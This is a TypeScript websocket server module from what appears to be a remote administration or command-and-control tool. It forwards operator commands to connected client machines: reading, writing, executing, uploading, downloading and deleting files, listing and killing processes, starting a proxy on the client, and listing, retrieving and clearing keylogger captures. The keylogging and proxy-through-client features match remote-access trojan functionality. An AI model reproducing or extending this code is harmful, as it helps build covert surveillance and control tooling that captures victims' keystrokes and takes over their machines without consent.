import type { ServerWebSocket } from "bun";
import { decode as msgpackDecode, encode as msgpackEncode } from "@msgpack/msgpack";
import { v4 as uuidv4 } from "uuid";
import { AuditAction, logAudit } from "../auditLog";
import * as clientManager from "../clientManager";
import { logger } from "../logger";
import { metrics } from "../metrics";
import { encodeMessage } from "../protocol";
import * as sessionManager from "../sessions/sessionManager";
import type { SocketData } from "../sessions/types";
import { normalizeFileUploadPayload } from "../fileTransfers";

type FileBrowserViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

type ProcessViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

type WsViewerClusterDeps = {
  pendingHttpDownloads: Map<string, unknown>;
  consumeHttpDownloadPayload: (payload: any) => Promise<void> | void;
};

function decodeViewerPayload(raw: string | ArrayBuffer | Uint8Array): any | null {
  if (typeof raw === "string") {
    try {
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }
  try {
    const buf = raw instanceof Uint8Array ? raw : new Uint8Array(raw);
    return msgpackDecode(buf);
  } catch {
    return null;
  }
}

function safeSendViewer(ws: ServerWebSocket<SocketData>, payload: unknown) {
  try {
    ws.send(msgpackEncode(payload));
  } catch (err) {
    logger.error("[viewer] send failed", err);
  }
}

export function handleFileBrowserViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId } = ws.data;
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session: FileBrowserViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.getAllFileBrowserSessions().set(sessionId, session);
  ws.data.sessionId = sessionId;
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleFileBrowserViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  logger.debug(`[DEBUG] File browser message from viewer for client ${clientId}:`, payload.type, payload.commandType || "");

  const target = clientManager.getClient(clientId);
  if (!target) {
    logger.debug(`[DEBUG] Client ${clientId} not found - sending offline status`);
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();

  if (payload.type === "command") {
    if (typeof payload.commandType !== "string") return;
    logger.debug(`[DEBUG] Handling command type: ${payload.commandType}`);
    const actualPayload = payload.payload || {};
    switch (payload.commandType) {
      case "file_read":
        logger.debug(`[DEBUG] Forwarding file_read to client ${clientId}:`, actualPayload.path);
        target.ws.send(encodeMessage({ type: "command", commandType: "file_read", id: payload.id || commandId, payload: actualPayload } as any));
        metrics.recordCommand("file_read");
        break;
      case "file_write":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_write", id: payload.id || commandId, payload: actualPayload } as any));
        metrics.recordCommand("file_write");
        break;
      case "file_search":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_search", id: payload.id || commandId, payload: actualPayload } as any));
        metrics.recordCommand("file_search");
        break;
      case "file_copy":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_copy", id: payload.id || commandId, payload: actualPayload } as any));
        metrics.recordCommand("file_copy");
        break;
      case "file_move":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_move", id: payload.id || commandId, payload: actualPayload } as any));
        metrics.recordCommand("file_move");
        break;
      case "file_chmod":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_chmod", id: payload.id || commandId, payload: actualPayload } as any));
        metrics.recordCommand("file_chmod");
        break;
      case "file_execute":
        logger.debug(`[DEBUG] Forwarding file_execute to client ${clientId}:`, actualPayload.path);
        target.ws.send(encodeMessage({ type: "command", commandType: "file_execute", id: payload.id || commandId, payload: actualPayload } as any));
        metrics.recordCommand("file_execute");
        break;
      default:
        break;
    }
    return;
  }

  switch (payload.type) {
    case "file_list":
      target.ws.send(encodeMessage({ type: "command", commandType: "file_list", id: commandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_list");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_LIST,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    case "file_download":
      target.ws.send(encodeMessage({ type: "command", commandType: "file_download", id: commandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_download");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_DOWNLOAD,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    case "file_upload": {
      const upload = normalizeFileUploadPayload(payload);
      if (!upload) return;
      target.ws.send(encodeMessage({
        type: "command",
        commandType: "file_upload",
        id: commandId,
        payload: {
          path: upload.path,
          data: upload.data,
          offset: upload.offset,
          total: upload.total,
          transferId: upload.transferId,
        },
      } as any));
      metrics.recordCommand("file_upload");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_UPLOAD,
        targetClientId: clientId,
        details: JSON.stringify({ path: upload.path, size: upload.data.length, offset: upload.offset }),
        success: true,
      });
      break;
    }
    case "file_delete": {
      const deleteCommandId = payload.commandId || commandId;
      target.ws.send(encodeMessage({ type: "command", commandType: "file_delete", id: deleteCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_delete");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_DELETE,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "file_mkdir": {
      const mkdirCommandId = payload.commandId || commandId;
      target.ws.send(encodeMessage({ type: "command", commandType: "file_mkdir", id: mkdirCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_mkdir");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_MKDIR,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "file_zip": {
      const zipCommandId = payload.commandId || commandId;
      target.ws.send(encodeMessage({ type: "command", commandType: "file_zip", id: zipCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_zip");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_ZIP,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "command_abort":
      target.ws.send(encodeMessage({ type: "command_abort", commandId: payload.commandId } as any));
      break;
    default:
      break;
  }
}

export function handleFileBrowserMessage(clientId: string, payload: any, deps: WsViewerClusterDeps) {
  const type = payload?.type as string | undefined;
  const isHttpDownload =
    type === "file_download" &&
    typeof payload?.commandId === "string" &&
    deps.pendingHttpDownloads.has(payload.commandId);

  if (type === "file_download" && typeof payload?.commandId === "string") {
    void deps.consumeHttpDownloadPayload(payload);
  }

  let hasSession = false;
  for (const session of sessionManager.getAllFileBrowserSessions().values()) {
    if (session.clientId !== clientId) continue;
    if (!hasSession) {
      hasSession = true;
      if (type && type !== "command_result" && type !== "command_progress") {
        logger.debug(`[filebrowser] client=${clientId} type=${type}`);
      }
    }
    if (isHttpDownload) {
      continue;
    }
    if (payload.type === "file_download" && payload.data) {
      const data = payload.data instanceof Uint8Array ? payload.data : new Uint8Array(payload.data);
      safeSendViewer(session.viewer, { ...payload, data });
    } else {
      safeSendViewer(session.viewer, payload);
    }
  }
}

export function handleProcessViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId } = ws.data;
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session: ProcessViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.getAllProcessSessions().set(sessionId, session);
  ws.data.sessionId = sessionId;
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleProcessViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();
  switch (payload.type) {
    case "process_list":
      target.ws.send(encodeMessage({ type: "command", commandType: "process_list", id: commandId } as any));
      metrics.recordCommand("process_list");
      break;
    case "process_kill": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_kill", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_kill");
      break;
    }
    default:
      break;
  }
}

export function handleProcessMessage(clientId: string, payload: any) {
  for (const session of sessionManager.getAllProcessSessions().values()) {
    if (session.clientId !== clientId) continue;
    safeSendViewer(session.viewer, payload);
  }
}

export function handleProxyViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId } = ws.data;
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addProxySession(session);
  ws.data.sessionId = sessionId;
  logger.info(`[proxy] viewer connected session=${sessionId} client=${clientId}`);
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleProxyViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();
  switch (payload.type) {
    case "proxy_start": {
      const port = typeof payload.port === "number" ? payload.port : 1080;
      target.ws.send(encodeMessage({ type: "command", commandType: "proxy_start", id: commandId, payload: { port } } as any));
      metrics.recordCommand("proxy_start");
      break;
    }
    case "proxy_stop":
      target.ws.send(encodeMessage({ type: "command", commandType: "proxy_stop", id: commandId } as any));
      metrics.recordCommand("proxy_stop");
      break;
    default:
      break;
  }
}

export function handleProxyMessage(clientId: string, payload: any) {
  for (const session of sessionManager.getAllProxySessions().values()) {
    if (session.clientId !== clientId) continue;
    safeSendViewer(session.viewer, payload);
  }
}

export function handleKeyloggerViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId } = ws.data;
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addKeyloggerSession(session);
  ws.data.sessionId = sessionId;
  logger.info(`[keylogger] viewer connected session=${sessionId} client=${clientId}`);
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleKeyloggerViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();
  switch (payload.type) {
    case "keylog_list":
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_list", id: commandId } as any));
      metrics.recordCommand("keylog_list");
      break;
    case "keylog_retrieve": {
      const filename = typeof payload.filename === "string" ? payload.filename : "";
      if (!filename) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid filename" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_retrieve", id: commandId, payload: { filename } } as any));
      metrics.recordCommand("keylog_retrieve");
      break;
    }
    case "keylog_clear_all":
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_clear_all", id: commandId } as any));
      metrics.recordCommand("keylog_clear_all");
      break;
    case "keylog_delete": {
      const filename = typeof payload.filename === "string" ? payload.filename : "";
      if (!filename) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid filename" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_delete", id: commandId, payload: { filename } } as any));
      metrics.recordCommand("keylog_delete");
      break;
    }
    default:
      break;
  }
}

export function handleKeyloggerMessage(clientId: string, payload: any) {
  for (const session of sessionManager.getAllKeyloggerSessions().values()) {
    if (session.clientId !== clientId) continue;
    safeSendViewer(session.viewer, payload);
  }
}
